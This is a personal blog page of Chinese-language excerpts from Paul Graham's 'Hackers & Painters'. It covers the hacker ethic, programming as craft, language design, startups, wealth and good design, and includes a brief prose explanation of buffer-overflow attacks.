<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <title>黑客与画家——书摘</title>
    <meta name="description" content="newhuan">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <link rel="stylesheet" href="../../../../css/app.css">
    <script src="../../../../js/element.js"></script>
    <meta name="apple-mobile-web-app-title" content="newhuan">
</head>
<body class="body body-article">
    <div class="full-header">
        <div class="container">
            <div class="logo">
                <a href="../../../index.html" title="newhuan" alt="newhuan">首頁</a>
            </div>
            <div class="nav">
            </div>
        </div>
    </div>
    <div class="full-container">
        <div class="container">
            <div class="content">
                <h1 class="title">黑客与画家——书摘</h1>
                <h3 class="date">20170510</h3>
                <div class="clearfix typo">
                   <p> 黑客与画家:硅谷创业之父Paul Graham文集, Paul Graham</p><p>


                    他鼓励创业公司快速发布产品，因为这样可以尽早知道一个创意是否可行。其次，他认为一定要特别关注用户需要什么，这样才有办法将一个坏项目转变成好项目。</p><p>

                    你需要倾听用户的声音，琢磨他们需要什么，然后就去做。”</p><p>

                    出于兴趣而解决某个难题，不管它有没有用，这就是黑客。”</p><p>

                    黑客行为必须包含三个特点：好玩、高智商、探索精神。</p><p>

                    使用计算机以及所有有助于了解这个世界本质的事物都不应受到任何限制。任何事情都应该亲手尝试。</p><p>

                    信息应该全部免费。</p><p>


                    不信任权威，提倡去中心化。</p><p>

                    判断一名黑客的水平应该看他的技术能力，而不是看他的学历、年龄或地位等其他标准。</p><p>

                    hacking, not bogus(伪造的，假的) criteria（标准） such as degrees（学历）,</p><p>

                    hacking,</p><p>

                    你可以用计算机创造美和艺术。</p><p>

                    计算机使生活更美好。</p><p>

                    真正的黑客致力于改变世界，让世界运转得更好。</p><p>

                    优秀的黑客养成了一种质疑一切的习惯。</p><p>

                    在那里没有你不敢想的事情，只要你愿意承担冒险后果。 如果我成功实现了自己对这本书的设想，那么它也将是一片智力的大西部。</p><p>

                    任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。</p><p>

                    在任何社会等级制度中，那些对自己没自信的人就会通过虐待他们眼中的下等人来突显自己的身份。我已经意识到，正是因为这个原因，在美国社会中底层白人是对待黑人最残酷的群体。</p><p>

                    这就好像一群人成群结伙地去打猎一样。他们实际上并不恨你，他们只是需要一个共同的目标。</p><p>

                    你在其他地方有所得，就会在这个地方有所失。</p><p>

                    不把所有时间用来玩一种耗尽全力但又毫无意义的游戏。</p><p>

                    成年人很清楚不用在乎别人怎么想，我们就没有这种自信了。</p><p>

                    成年人在真实世界中形成的团体，一般来说，都存在某个共同目标，团体的领导者往往由最善于实现目标的人担任。</p><p>

                    我误解最深的一个词是“老成”（tact）。成年人使用这个词，含义似乎就是“闭上嘴巴，不要说话”。我以为它与“缄默”（tacit）和“不苟言笑”（taciturn）有着相同的词根，字面意思就是安静。我就对自己发誓，我绝不要变成“老成”的人，没有人能够让我闭上嘴巴。可是事实上，这个词的词根与“触觉”（tactile）相同，它真正的意思是熟练的碰触。“老成”的反义词是“笨拙”（clumsy）。进入大学以后，我才搞明白了这个词。</p><p>

                    我觉得最难的部分，其实是能否意识到你该做什么。</p><p>

                    对生活立竿见影的改变，可能还是来自于书呆子自己。</p><p>

                    它只是一个暂时的过程，只要你向前看，你就能超越它，哪怕现在你还是身处其中。</p><p>

                    创造优美事物的方式往往不是从头做起，而是在现有成果的基础上做一些小小的调整，或者将已有的观点用比较新的方式组合起来。</p><p>

                    人们阅读这些作品，只有一个理由，那就是欣赏作品本身。因此，只有人们真正欣赏它们，才会发出赞美……”</p><p>

                    在理论上，你需要知道如何计算“时间复杂度”和“空间复杂度”（time and space complexity）；如果你要写一个解析器，可能还需要知道状态机（state machine）的概念；除此以外，并不需要知道特别多的理论。</p><p>

                    你把整个程序想清楚的时间点，应该是在编写代码的同时，而不是在编写代码之前，这与作家、画家和建筑师的做法完全一样。</p><p>

                    编程语言首要的特性应该是允许动态扩展（malleable）。
                    编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。如果大家都像学校教的那样编程，那么静态类型④（static typing）是一个不错的概念。但是，我认识的黑客，没有一个人喜欢用静态类型语言编程。我们需要的是一种可以随意涂抹、擦擦改改的语言，我们不想正襟危坐，把一个盛满各种变量类型的茶杯，小心翼翼放在自己的膝盖上，为了与一丝不苟的编译器大婶交谈，努力地挑选词语，确保变量类型匹配，好让自己显得礼貌又周到。</p><p>

                    大学和实验室强迫黑客成为科学家，企业强迫黑客成为工程师。</p><p>

                    大公司为了避免设计上的灾难，选择了减少设计结果的标准差。但是当你排斥差异的时候，你不仅将失败的可能性排除在外，也将获得高利润的可能性排除在外。这对大公司来说不是问题，因为生产特别优秀的产品不是它们的获胜手段。大公司只要做到不太烂，就能赢。</p><p>

                    真正竞争软件设计的战场是新兴领域的市场，这里还没有人建立过防御工事。只要你能做出大胆的设计，由一个人或一批人同时负责设计和实现产品，你就能在这里战胜大公司。</p><p>

                    开发优秀软件的方法之一就是自己创业。</p><p>

                    黑客如何才能做自己喜欢的事情？我认为这个问题的解决方法是一个几乎所有创作者都知道的方法：找一份养家糊口的“白天工作”（day job）。</p><p>

                    一份为了赚钱的工作，还有一份为了爱好的工作。</p><p>

                    当我说，黑客解决生计问题的方法是找一份“白天工作”，然后在其余时间开发优美的软件，我并没有说这是一个新方法。开源软件界的黑客早就这样做了。我想说的其实是，开源软件的这种工作模式可能就是正确的模式，因为它已经被其他领域的创作者都验证过了。 令我惊讶的是，雇主都很犹豫，不愿意</p><p>

                    要是你很热爱编程，你就不可避免地会开发你自己的项目。</p><p>

                    因为如果你不爱一件事，你不可能把它做得真正优秀，要是你很热爱编程，你就不可避免地会开发你自己的项目。</p><p>

                    有一件事情是可以借鉴的（至少可以确认），那就是应该如何学习编程。画家学习绘画的方法主要是动手去画，黑客学习编程的方法也理应如此。大多数黑客不是通过大学课程学会编程的，他们从实践中学习，13岁时就自己动手写程序了。即使上了大学，黑客学习编程依然主要通过自己写程序。</p><p>

                    应该定期地从头开始，而不要长年累月地在一个项目上不断工作，并且试图把所有的最新想法都以修订版的形式包括进去。</p><p>

                    黑客通过实践学习编程，这又是一个标志，说明黑客与科学家的区别有多大。</p><p>

                    黑客的出发点是原创，最终得到一个优美的结果；</p><p>

                    黑客可以通过观看优秀的程序学会编程，不是看它们的执行结果，而是看它们的源代码。</p><p>

                    UNIX第6版源码注释</p><p>

                    你不能盼望先有一个完美的规格设计，然后再动手编程，这样想是不现实的。如果你预先承认规格设计是不完美的，在编程的时候，就可以根据需要当场修改规格，最终会有一个更好的结果。</p><p>


                    不要太早决定一个程序应该怎么做。</p><p>

                    动态类型语言在这一点上就是赢家，因为你不必提前就设置好各种变量的数据类型。不过我认为，编程语言灵活性的关键还不在这里，而在于这种语言应该非常抽象。</p><p>

                    容易修改的语言就是简短的语言。</p><p>

                    坚持一丝不苟，就能取得优秀的成果。因为那些看不见的细节累加起来，就变得可见了。</p><p>

                    优秀的软件也要求对美的狂热追求。如果你查看优秀软件的内部，就会发现那些预料中没有人会看见的部分也是优美的。</p><p>

                    如果黑客只是一个负责实现领导意志的技术工人，职责就是根据规格说明书写出代码，那么他其实与一个挖水沟的工人是一样的，从这头挖到那头，仅此而已。但是，如果黑客是一个创作者，他从事的就不是机械性的工作，他必须具备灵感。</p><p>

                    暂时放手有时也能防止热情熄火。</p><p>

                    在你厌倦的时候再去做那些比较容易的工作，这是个不错的主意。</p><p>

                    对于编程，这实际上意味着你可以把bug留到以后解决。消灭bug对我来说属于轻松的工作，只有在这个时候，编程才变得直接和机械，接近社会大众想象中的编程的样子。消灭bug的过程就像解一道数学题，已知许许多多的约束条件，你只要根据条件对方程求解就可以了。你的程序应该能产生x结果，但是却产生了y结果。哪里出错了？你知道自己最后肯定能解决这个问题，所以做起来就很轻松，就好像刷墙一样，接近于休闲了。</p><p>

                    这也是多人共同开发一个软件的正确模式。需要合作，但是不要“合”得过头。如果一个代码块由三四个人共同开发，</p><p>

                    正确的合作方法是将项目分割成严格定义的模块，每一个模块由一个人明确负责。模块与模块之间的接口经过精心设计，如果可能的话，最好把文档说明写得像编程语言规范那样清晰。</p><p>

                    时刻考虑到用户的人性需要，这样才能做出伟大的产品。你必须能够站在用户的角度思考问题，也就是说你必须学会“换位思考”。</p><p>

                    事实表明，从他人的角度思考问题正是成功的奥秘所在。“</p><p>

                    “换位思考”并不就意味着你要做自我牺牲。实际上，这是完全不同的两回事。了解别人对于事情的看法，并不代表你为他的利益服务。某些情况下，比如打仗的时候，了解对手正是为了打击对手 —— *知道别人的期望 同时兼顾自己和他人的期望</p><p>

                    有些黑客很聪明，但是完全以自我为中心，根本不会设身处地为用户考虑。这样的人很难设计出优秀软件，因为他们不从用户的角度看待问题?。</p><p>

                    判断一个人是否具备“换位思考”的能力有一个好方法，那就是看他怎样向没有技术背景的人解释技术问题。</p><p>

                    为了写出优秀软件，你必须假定用户对你的软件基本上一无所知。</p><p>

                    所以软件的使用方式最好能符合用户的直觉，别指望用户去读使用手册。</p><p>

                    程序写出来是给人看的，附带能在机器上运行。</p><p>

                    一下Abelson和Sussman的那句话：“程序写出来是为了让人看懂它的算（解）法，附带告诉计算机如何执行。”一种好的编程语言应该比英语更容易解释软件。只有在那些不太成熟、容易出现问题的地方，你才应该加上注释，提醒读者注意那里，就好像公路上只有在急转弯处才会出现警示标志一样。</p><p>

                    编程到底能够有多酷，取决于我们能够用这种新媒介做出怎样的工作。</p><p>

                    祸从口出”。你一定要小心自己说的话。自以为无害的言论会给你惹来大麻烦。</p><p>

                    书呆子就是那样惹上麻烦的。他们穿着不流行的衣服，讲着不合适的话。他们觉得自己说出了正确的观点，实际上却惹来了麻烦。习俗的力量不足以束缚他们。</p><p>

                    别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。</p><p>

                    如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。</p><p>

                    如果你真的相信了它，凡是不认同社会之处，你连想都不敢想，马上就放弃自己的观点，那才会真正出问题。</p><p>

                    最令人暴跳如雷的言论，就是被认为说出了真相的言论。</p><p>

                    我们试图让自己变得“非主观”（nonjudgmental）的种种努力，在未来人们看来，都将是我们的最滑稽可笑之处。</p><p>

                    如果有些观点我们不能说出口，原因很可能是某些团体不允许我们说。</p><p>

                    带动流行的两种力量之中，恐惧心比抱负心有力得多。</p><p>

                    在新事物面前，人们会感到自己错了：这是我早就应该知道的事情啊。</p><p>

                    优秀作品往往来自于其他人忽视的想法，而最被忽视的想法就是那些被禁止的思想观点。</p><p>

                    看来存在一个很清晰的关联关系：智力越高的人，越愿意去思考那些惊世骇俗的思想观点。这不仅仅因为聪明人本身很积极地寻找传统观念的漏洞，还因为传统观念对他们的束缚力很小，很容易摆脱。从他们的衣着上你就可以看出这一点：不受传统观念束缚的人，往往也不会穿流行的衣服。</p><p>

                    看到别人看不到或不敢看的东西，你就有很大的优势。</p><p>

                    一个公司是否健康运作，可以用一个指标衡量，那就是对负面评价的容忍程度。</p><p>

                    训练自己去想那些不能想的事情，</p><p>

                    一旦发现了“不能说的话”，下一步怎么办？我的建议就是别说，至少也要挑选合适的场合再说，只打那些值得打的仗。</p><p>

                    与笨蛋辩论，你也会变成笨蛋。</p><p>

                    自由思考比畅所欲言更重要。</p><p>

                    如果你感到一定要跟那些人辩个明白，绝不咽下这口气，一定要把话说清楚，结果很可能是从此你再也无法自由理性地思考</p><p>

                    我认为这样做不可取，更好的方法是在思想和言论之间划一条明确的界线。在心里无所不想，但是不一定要说出来。</p><p>

                    你的思想是一个地下组织，绝不要把那里发生的事情一股脑说给外人听。</p><p>

                    守口如瓶，笑脸相迎，也就是说，你要对每一个人微笑，但是不要说出自己的真实想法。</p><p>

                    人们喜欢讨论的许多问题实际上都是很复杂的，马上说出你的想法对你并没有什么好处。</p><p>

                    所谓“元标签”，就是对某个标签的抽象描述。</p><p>

                    在他们看来，所有观点都是可以讨论的，除了那些错的观点。</p><p>

                    你不要让自己成为人群的一分子，而要尽可能地远离人群，观察正在发生的事情，特别注意那些被压制的思想观点。</p><p>

                    因为只要不是错的观点，就不应该被压制讨论。所以每当你看到有些话被攻击为出自××分子或××主义，这就是一个明确的信号，表明背后有问题。</p><p>

                    你不仅要远距离观察人群，更要远距离观察你自己。顺便提一句，这可不是激进的想法，</p><p>

                    如果你想要清晰地思考，就必须远离人群。但是走得越远，你的处境就会越困难，受到的阻力也会越大，因为你没有迎合社会习俗，而是一步步地与它背道而驰。</p><p>

                    很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。</p><p>

                    如果自己就是潮水的一部分，怎么能看见潮流的方向呢？你只能永远保持质疑。问自己，什么话是我不能说的？为什么？</p><p>

                    不服从管教，其实是黑客之所以成为优秀程序员的原因之一。</p><p>

                    只有深入了解当前的技术，黑客才能构想下一代技术。</p><p>

                    如果他们做出了一个东西，他们自己总是无法百分百确定那到底是什么东西。有可能完全没用，但是只要那些出错的地方还算正常，那么就是一个信号，表明这个东西还有希望。</p><p>

                    但是黑客的所作所为完全出于兴趣，想到哪里就做到哪里，没有明确的计划，只求开心。</p><p>

                    很自负的人必须培养出敏锐的感觉，及时发现周围情势的变化，知道怎样才能脱身。最近，黑客就感觉不太对，大气候变了。对于不服从管教，政治气氛变得严厉了。⑩</p><p>

                    人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。</p><p>

                    人们惊慌失措时采取的措施到头来产生了适得其反的效果。</p><p>

                    大多数人，在大多数时候，总是选择最省事的做法。</p><p>

                    在任何终端设备上获取你的数据，终端设备不一定是电脑。</p><p>

                    他们必须正确地设计软件，使得它能够平滑升级，不让使用者感到困惑。这就是互联网软件面临的新问题，</p><p>

                    允许两个用户同时编辑一个文档是一项很有用的功能。</p><p>

                    保证Unix系统安全的关键之一就是不运行那些不需要的东西，降低服务器被侵入的可能性。</p><p>

                    更好更简单的方法，应该是所有的工作都放在服务器端完成。</p><p>

                    很难用纯粹的“函数式编程”完成整个程序，但是它可以用来编写一些重要的部分，使得这些部分易于调试，因为它们不包含“状态”（state），非常便于不断对代码进行小幅的修改和调试。</p><p>

                    束之高阁，至少过上一段时间再来考虑。但是，构思这种东西有一个特点，那就是它会导致更多的构思。你有没有注意过，坐下来写东西的时候，一半的构思是写作时产生的？软件也是这样。实现某个构思，会带来更多的构思。所以，将一个构思束之高阁，不仅意味着延迟它的实现，还意味着延迟所有在实现过程中激发的构思。事实上，将一个构思束之高阁，甚至会限制新构思的产生。因为你看一眼堆放在一边、还没有实现的构思，就会想“我已经为下一个版本准备了很多新东西要实现了”，你就懒得再思考更多的新功能了。</p><p>

                    计划这个词，只是将构思束之高阁的另一种表达方式。只要想到好的构思，我们就立刻着手实现。</p><p>

                    本质上，软件项目的人力与工期是无法互换的，当项目进度落后时，光靠增加人力到该项目中，并不会加快进度，反而有可能使进度更加延后。</p><p>

                    人数越来越少，软件开发的效率将指数式增长。</p><p>

                    第一年之后就不必每分钟都盯着服务器了，但是对新变动的部分一定要密切关注。不要在半夜里发布代码，然后回家睡觉。</p><p>

                    软件应该做到用户认为它可以做到的事情。</p><p>

                    因为顾客总是对的，所以这表明你需要修正软件。</p><p>

                    所以，只要我们能让更多的访问者坚持完成在线试用，我们的用户增长率就会提升。</p><p>

                    它称应该让用户像订报纸那样按照使用时间长短订购软件的使用权。第一眼看上去，这种说话好像很滑稽。但是后来，我意识到这个观点是对的，因为它反映了软件开发的现实：软件开发不是静态的，而是一个持续不断的动态过程。</p><p>

                    “订报纸模式”正是互联网软件天然的收费模式。</p><p>

                    叫做“价格歧视”（price discrimination）的定价方法，也就是针对不同的客户给出不同的报价，使得利润最大化。</p><p>

                    公司内部所有不直接感受到竞争压力的部门都应该外包出去，让它们暴露在竞争压力之下。</p><p>

                    有钱的客户倾向于更贵的选择，即使便宜的选择更符合他们的需要，他们也不会买。</p><p>

                    如果只需要一个带浏览器的终端设备就能完成所有工作，你就不需要微软了。</p><p>

                    体积小、反应快的浏览器，本身就是好东西，会鼓励厂商开发小型的互联网设备。</p><p>

                    如果新事物真的有重大改进，那么它总是可以找到生存空间的。</p><p>

                    你必须打破常规、快速行动，循规蹈矩不可能成功。</p><p>

                    因为你能做到，所以你必须做到。</p><p>

                    因为你必须做到，所以你能够做到。</p><p>

                    如果你是一个黑客，并且梦想自己创业，可能会有两件事情令你望而却步，不敢真正开始采取行动。一件是你不懂得管理企业，另一件是你害怕竞争。</p><p>

                    管理企业其实很简单，只要记住两点就可以了：做出用户喜欢的产品，保证开支小于收入。</p><p>

                    随着事业的发展，你自己就能琢磨出来其他的诀窍。</p><p>

                    从制造简洁的产品开始着手，首先要保证你自己愿意使用。然后，迅速地做出第一版，并且不断加以改进，整个过程中密切倾听用户的反馈。用户总是对的，但是不同的用户要求不一样。</p><p>

                    做到这一点的方法是正确设置默认值，而不是限制用户的选择。</p><p>

                    比较软件的标准应该是看对手的软件将来会有什么功能，而不是现在有什么功能。无论何时，你都要使用自己的软件。</p><p>

                    关键是你要自己判断，不要盲从。只有懂得设计的黑客，才能设计软件，不能交给对软件一知半解的设计师。如果你不打算自己动手设计和开发，那就不要创业。</p><p>

                    致富的最好方法就是为社会创造财富。创造财富的最好方法就是创业。</p><p>

                    创业公司其实就是解决了某个技术难题的小公司。</p><p>

                    仅仅因为工作经常受到干扰，黑客就会无法应对高难度的项目。</p><p>

                    许多大公司的内部，平均主义泛滥。如果采用自由市场制度那样的机制，你的公司就可以变成一个很有效率的地方。</p><p>

                    这里的假设是，如果每个员工按照他创造的财富获得报酬，那么整个公司的利润将最大化。</p><p>

                    这里有一个守恒定律：如果你想赚100万美元，就不得不忍受相当于100万美元的痛苦。</p><p>

                    运气都是一个很大的随机因素。</p><p>

                    致富的方法有许多种，本文只谈论其中的一种，也就是通过创造有价值的东西在市场上得到回报，从而致富。</p><p>

                    你只需要做出别人需要的东西就可以了。</p><p>

                    如果物质财富保持不变，金钱越多，导致的唯一结果就是物价越高。</p><p>

                    财富才是你的目标，金钱不是。</p><p>

                    除非你打算伪造货币，否则使用“挣钱”这个词会不利于理解如何才能挣钱。</p><p>

                    方法就是给出对方需要的东西作为回报。</p><p>

                    交换媒介的优点是，它使得交易可以进行下去。缺点是，它往往模糊了交易的实质。</p><p>

                    我们这个世界，你向下沉沦或者向上奋进都取决于你自己，不能把原因推给外界。</p><p>

                    公司的存在目的就是满足人们的某种需要。</p><p>

                    工作就是在一个组织中，与许多人共同合作，做出某种人们需要的东西。</p><p>

                    销售员是一个例外。他们产生的收入很容易测量，他们的薪水往往是销售额的一个百分比。</p><p>

                    可测量性和可放大性</p><p>

                    是可测量的，否则你做得再多，也不会得到更多的报酬。此外，你还必须有可放大性，也就是说你做出的决定能够产生巨大的效应。</p><p>

                    如果你有一个令你感到安全的工作，你是不会致富的，因为没有危险，就几乎等于没有可放大性。</p><p>

                    一个因素是，每个划船手看不到自己更努力划桨有何不同；另一个因素是，一千人的团队使得任何个人的努力都被大大地平均化了。</p><p>

                    技术就是某种手段，就是我们做事的方式。</p><p>

                    技术的突破往往来自非常规的方法，小团队就较少受到常规方法的约束。</p><p>

                    一次开发，普遍适用</p><p>

                    一开始就选择较难的问题，此后的各种决策都选择较难的那个选项。</p><p>

                    如果你有两个选择，就选较难的那个。</p><p>

                    这个方法有效的原因可能是遇到两个一难一易的选择时，往往出于懒惰的缘故，你会选择较易的那个选项。在意识深处，你其实知道不懒惰的做法会带来更好的结果，这个方法只是迫使你接受这一点。</p><p>

                    事后才觉得自己很愚蠢。此后，我们就急不可耐地盼着把公司卖掉。</p><p>

                    因为他们多半是从商学院毕业的，没有经历过公司的创业期。他们宁愿花大钱做更安全的选择，所以向他们出售一家已经成功的创业公司。</p><p>

                    大多数时候，促成买方掏钱的最好办法不是让买家看到有获利的可能，而是让他们感到失去机会的恐惧。对于买家来说，最强的收购动机就是看到竞争对手可能收购你。</p><p>

                    他们真正在意的只是你拥有的用户数量。</p><p>

                    此外，将公司管理视同软件优化还能帮助你避免VC担心的另一个陷阱——开发某种产品的时间过长。现在，黑客都已经熟知这一点，并总结出一个术语“过早优化”（premature optimization）。尽快拿出第一版，然后根据用户的反映而不是自己的猜测进行软件优化。</p><p>

                    可测量性和可放大性。前者来自小团队的合作，后者来自开发新技术。</p><p>

                    如果说某种工作的报酬过低，那就相当于说人们的需求不正确。</p><p>

                    来源于满足他人的需求的创造活动，那么当你注意到有些人赚钱比其他人多得多时，你就会不偏不倚地得出“不公平”这个结论。</p><p>

                    那么结果可能是不平均的，但是很难说是不公平的。</p><p>

                    不要假设你的系统毫无漏洞，而是搞清楚多大程度上漏洞无法被利用。</p><p>

                    把品味说成个人的偏好可以有效地杜绝争论，防止人们争执哪一种品味更好。但是问题是，这种说法是不正确的。只要你自己开始动手设计东西，就能明白这一点。</p><p>

                    现在流行“相对主义”，即认为真理是相对的。</p><p>

                    好设计是简单的设计。</p><p>

                    只说必须要说的话，并且说得简短。</p><p>

                    如果解决方法是丑陋的，那就肯定还有更好的解决方法，只是还没有发现而已。</p><p>

                    如果你不愿别人的答案取代你的答案，你就只好自己做出最佳答案。</p><p>

                    好设计是解决主要问题的设计。</p><p>

                    好设计是启发性的设计。</p><p>

                    在软件业中，这条原则意味着，你应该为用户提供一些基本模块，使得他们可以随心所欲自由组合，就像玩乐高积木那样。</p><p>

                    好设计通常是有点趣味性的设计。</p><p>

                    幽默感是强壮的一种表现，始终拥有幽默感就代表你对厄运一笑了之，而丧失幽默感则表示你被厄运深深伤到。所以，强壮的标志（或者至少是特点）就是轻松面对自己的人生。充满自信的人常常像燕子一样，以一种居高临下的姿态轻盈地看待周围的一切，比如希区柯克拍摄的电影、世纪画家布勒哲尔（Bruegel）的绘画（甚至莎士比亚也是一个这方面的例子）</p><p>

                    好设计是艰苦的设计。</p><p>

                    你需要的是咬牙向前冲刺的痛苦，而不是脚被钉子扎破的痛苦。</p><p>

                    功能决定形式（form follows function），但是他们实际上的理解是功能应当决定形式。</p><p>

                    好设计是看似容易的设计。</p><p>

                    如果它真的那么简单，为什么发现人不是你呢？</p><p>

                    好设计是对称的设计。</p><p>

                    重复性对称和递归性对称。递归性对称就是指子元素的重复，比如树叶上叶脉的纹路。</p><p>

                    好设计是模仿大自然的设计。</p><p>

                    好设计是一种再设计。</p><p>

                    我的画已经过得去了，没准别人也会这么看。</p><p>

                    这想法很危险。你应该培养对自己的不满。</p><p>

                    好设计是能够复制的设计。</p><p>

                    把事情做对比原创更重要。</p><p>

                    不知不觉的模仿几乎必然将导致坏设计。如果你不知道自己的想法从何而来，那么你可能就是在模仿另一个模仿者。</p><p>

                    好设计常常是奇特的设计。</p><p>

                    唯一达到“奇特”的方法，就是追求做出好作品，完成之后再回过头看。</p><p>

                    好设计是成批出现的。</p><p>

                    推动人才成批涌现的最大因素就是，让有天赋的人聚在一起，共同解决某个难题。互相激励比天赋更重要，达 · 芬奇之所以成为达 · 芬奇，主要原因不仅仅是他的天赋，更重要的是他生活在当时的佛罗伦萨，而不是米兰。</p><p>

                    好设计常常是大胆的设计。</p><p>

                    优秀作品的秘诀就是：非常严格的品味，再加上实现这种品味的能力。</p><p>

                    所谓“编译器”，本身就是一个程序，作用是将简便方式书写的程序（就像上面这一行命令）转变为硬件可以理解的语言。</p><p>

                    编译器不是高级语言唯一的实现方法，另一种方法是使用解释器，它的作用是实时地将代码解释为相应的机器语言，然后一行行运行。相比之下，编译器则是先将整个程序全部翻译成机器语言，然后再运行。</p><p>

                    编译器处理的高级语言代码又叫做源码。</p><p>

                    产生的机器码就叫做目标码（二进制）。顾客购买市场上的商业软件时得到的往往只有目标码。</p><p>


                    最常见的几种入侵计算机的手法都是利用了C语言的某些特点。当你在C语言中为输入的内容分配出一片内存（也叫“缓存”）时，它会被分配在当前运行代码的返回地址旁边。所谓“返回地址”指的是一块特定内存，当前代码运行完毕以后，就要运行这块内存中包含的代码。也就是说，它实际上是计算机下一步要做的事情。</p><p>

                    假定有人打算入侵你的计算机，他们猜出你会为某种输入分配字节的缓存，于是他们就提交多于字节的内容，目的是覆盖旁边的“返回地址”。那么，当前代码运行完毕之后，程序的控制权就交给了他们指定的内存地址。这个地址通常是缓存的首地址，缓存中是入侵者事前编好的机器码。于是，入侵者的程序就运行在你的计算机上了。</p><p>

                    如果使用更抽象的高级语言，上面的事情是不可能发生的。但是，在C语言中，一旦接受用户输入的时候你没有检查输入长度，就创造出了一个安全漏洞。利用这种漏洞的攻击行为就被称为“缓冲区溢出攻击”。在这种攻击中，还有其他方法可以控制计算机，但是覆盖返回地址是最经典的一种。 有意思的是，劫持飞机与“缓冲区溢出攻击”有类似之处。在一般飞机上，乘客区与驾驶舱是相通的，就好像C语言中数据区与代码区是相邻的一样。劫机者一旦进入驾驶舱，</p><p>

                    ****实际上就相当于把自己从数据提升为代码。****</p><p>

                    目前最活跃的议题之一就是静态类型语言与动态类型语言之争。在静态类型语言中，写代码时必须知道每个变量的类型。而在动态类型语言中，随便什么时候，你都可以把变量设为任意类型的值。</p><p>

                    静态类型语言的拥护者认为这样可以防止bug，并且帮助编译器生成更快的代码（这两点理由都成立）。动态类型语言的拥护者认为静态类型对程序构成了限制（这点理由也成立）。</p><p>

                    你应该使用允许你面向对象编程的语言。至于你最后到底用不用则是另外一个问题了。</p><p>

                    这有点像买房子的时候你应该先考虑地理位置。别的地方将来出问题都有办法弥补，但是地理位置是没法变的。</p><p>

                    那些内核最小、最干净的编程语言才会存在于进化的主干上。一种语言的内核设计得越小、越干净，它的生命力就越顽强。</p><p>

                    如果其他条件不变，现在被认为运行速度慢的语言（即运行的效率不高）将来会有更大的发展空间。</p><p>

                    随着技术的发展，每一代人都在做上一代人觉得很浪费的事情。</p><p>

                    编程语言设置字符串似乎就是一个过早优化的例子。</p><p>

                    毕竟数组只是散列表的一个子集，其特点就是数组的键全部都是整数向量。
                    散列表（hash table）　一种类似数据库的数据结构，存储在里面的每一段数据都有一个对应的键，使用时只要按照键就可以取出对应的数据。</p><p>

                    任何进行数学运算的程序可能都是以二进制形式表示数字，但是这属于编译器的优化，而不属于语言内核语义的一部分。</p><p>

                    根据经验判断，每增加一个解释层，软件的运行速度就会慢一个数量级。但是，多余的软件层可以让编程灵活起来。</p><p>

                    字节码的典型运用就是Java语言。—— 生成字节码 => 让jvm（java虚拟机）运行</p><p>

                    某些使用面向对象编程开发出来的软件确实具有可重用性，但是这不是因为它使用了面向对象编程，而是因为它的开发方法是自下而上的。以函数库为例，它们具有可重用性，是因为它们属于语言的一部分，而不是因为它们采用面向对象或者其他编程方法。</p><p>

                    并行计算</p><p>

                    宏，</p><p>

                    对于人类这样懒惰的生物，喜欢用最省力的方式写程序是再自然不过的事情。但是事实上，我们的思想可能往往会受限于某种现存的语言，只采用在这种语言看来更简单的形式，它对我们思想的束缚作用会大得令人震惊。新语言必须靠你自己去发现，不能依靠那些让你自然而然就沉下去的思维定势。</p><p>

                    设计语言的正确做法就变成了，看着一段程序，然后问自己是不是能把它写得更短一点？</p><p>

                    伪码又称虚拟代码，用来抽象地描述算法，而不是现实存在的编程代码。</p><p>

                    学习开车的时候，一个需要记住的原则就是要把车开直，不是通过将车身对齐画在地上的分隔线，而是通过瞄准远处的某个点。即使你的目标只在几米开外，这样做也是正确的。我认为，设计编程语言时，我们也应该这样做。</p><p>

                    他建议从Python和Java入手，因为它们比较容易学。想当高级一点的黑客，还应该学习C和Perl。前者用来对付Unix系统，后者用来系统管理和开发CGI脚本。最后，真正非常严肃地把黑客作为人生目标的人，应该考虑学习Lisp：</p><p>

                    选择使用哪一种技术的时候，你不能考虑别人的做法，只能考虑什么样的技术能最好地完成工作。</p><p>

                    对于应用程序来说，还是应该选择总体最强大、效率也在可接受范围内的编程语言，否则都是不正确的选择，就好像你选择机器语言编程一样，只是程度上有差异而已。</p><p>

                    技术的变化速度通常是很快的。但是，编程语言不一样，与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。所以，一种很普通的编程语言就是很普通的程序员使用的语言，它的变化就像冰山那样缓慢。</p><p>

                    你的程序可能无法很好地与使用其他语言写的程序协同工作；你可能找不到很多函数库；你可能不容易雇到程序员。</p><p>

                    这也能解释为什么像Perl和Python这样的新语言会流行起来，它们之所以流行不是因为人们使用它们开发Windows应用程序，而是因为人们在服务器上使用它们。随着软件从桌面端向服务器端转移（连微软公司都看出这是未来的趋势），逼迫你使用某一种语言的限制将越来越少。</p><p>

                    因为：（a）如果你使用的语言很强大，可能会减少一些编程的工作量，也就不需要那么多黑客了；（b）使用更高级语言的黑客可能比别的程序员更聪明。</p><p>

                    如果你创业的话，千万不要为了取悦风险投资商或潜在并购方而设计你的产品。让用户感到满意才是你的设计方向。只要赢得用户，其他事情就会接踵而来。如果没有用户，谁会关心你选择的“正统”技术是多么令人放心。</p><p>

                    不是用基础语言（base language）开发应用程序，而是在基础语言之上先构建一种你自己的语言（宏？），然后再用后者开发应用程序。这样写出来的代码会比直接用基础语言开发出来的短得多。实际上，大多数压缩算法也是这样运作的。“自下而上”的编程往往也便于修改，因为许多时候你自己添加的中间层根本不需要变化，你只需要修改前端逻辑就可以了。</p><p>

                    “业内最佳实践”我认为这个词原来是指某种核算方法，大致意思就是不要采用很奇怪的处理方法。在核算方法中，这可能是一个很好的主意。</p><p>

                    编程语言的所谓“业界最佳实践”，实际上不会让你变成最佳，只会让你变得很平常。</p><p>

                    第一，不同语言的编程能力不一样。第二，大多数经理故意忽视第一点。你把这两点事实结合起来，其实就得到了赚钱的诀窍。</p><p>

